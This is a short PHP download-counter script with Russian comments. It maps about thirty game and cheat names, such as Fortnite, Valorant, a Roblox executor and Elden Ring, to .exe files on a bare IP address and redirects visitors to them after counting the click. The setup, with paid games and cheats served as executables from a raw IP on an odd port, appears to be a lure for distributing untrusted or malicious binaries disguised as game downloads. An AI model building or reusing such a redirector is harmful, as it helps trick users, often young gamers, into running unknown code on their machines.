<?php
// Файл для подсчета скачиваний
$file = $_GET['file'] ?? '';

// База файлов и их реальных путей
$files = [
    'xeno' => 'http://194.79.46.110:1080/mrx/xeno.exe',
    'fortnite' => 'http://194.79.46.110:1080/mrx/fortnite.exe',
    'valorant' => 'http://194.79.46.110:1080/mrx/valorant.exe',
    'warzone' => 'http://194.79.46.110:1080/mrx/warzone.exe',
    'apex' => 'http://194.79.46.110:1080/mrx/apex.exe',
    'csgo' => 'http://194.79.46.110:1080/mrx/csgo.exe',
    'roblox' => 'http://194.79.46.110:1080/mrx/roblox.exe',
    'minecraft-cheat' => 'http://194.79.46.110:1080/mrx/minecraft-cheat.exe',
    'rainbow' => 'http://194.79.46.110:1080/mrx/rainbow.exe',
    'overwatch' => 'http://194.79.46.110:1080/mrx/overwatch.exe',
    'gtav' => 'http://194.79.46.110:1080/mrx/gtav.exe',
    'witcher' => 'http://194.79.46.110:1080/mrx/witcher.exe',
    'cyberpunk' => 'http://194.79.46.110:1080/mrx/cyberpunk.exe',
    'rdr2' => 'http://194.79.46.110:1080/mrx/rdr2.exe',
    'elden' => 'http://194.79.46.110:1080/mrx/elden.exe',
    'skyrim' => 'http://194.79.46.110:1080/mrx/skyrim.exe',
    'fallout' => 'http://194.79.46.110:1080/mrx/fallout.exe',
    'acvalhalla' => 'http://194.79.46.110:1080/mrx/acvalhalla.exe',
    'dragonage' => 'http://194.79.46.110:1080/mrx/dragonage.exe',
    'massEffect' => 'http://194.79.46.110:1080/mrx/massEffect.exe',
    'minecraft' => 'http://194.79.46.110:1080/mrx/minecraft.exe',
    'amongus' => 'http://194.79.46.110:1080/mrx/amongus.exe',
    'terraria' => 'http://194.79.46.110:1080/mrx/terraria.exe',
    'stardew' => 'http://194.79.46.110:1080/mrx/stardew.exe',
    'gtaSa' => 'http://194.79.46.110:1080/mrx/gtaSa.exe',
    'gtaVc' => 'http://194.79.46.110:1080/mrx/gtaVc.exe',
    'needForSpeed' => 'http://194.79.46.110:1080/mrx/needForSpeed.exe',
    'sims4' => 'http://194.79.46.110:1080/mrx/sims4.exe',
    'fifa' => 'http://194.79.46.110:1080/mrx/fifa.exe',
    'codmw' => 'http://194.79.46.110:1080/mrx/codmw.exe'
];

if (isset($files[$file])) {
    // Увеличиваем счетчик
    $countFile = 'download_counts.json';
    $counts = file_exists($countFile) ? json_decode(file_get_contents($countFile), true) : [];
    $counts[$file] = ($counts[$file] ?? 0) + 1;
    file_put_contents($countFile, json_encode($counts));
    
    // Перенаправляем на реальный файл
    header('Location: ' . $files[$file]);
    exit;
} else {
    echo 'Файл не найден';
}
?>
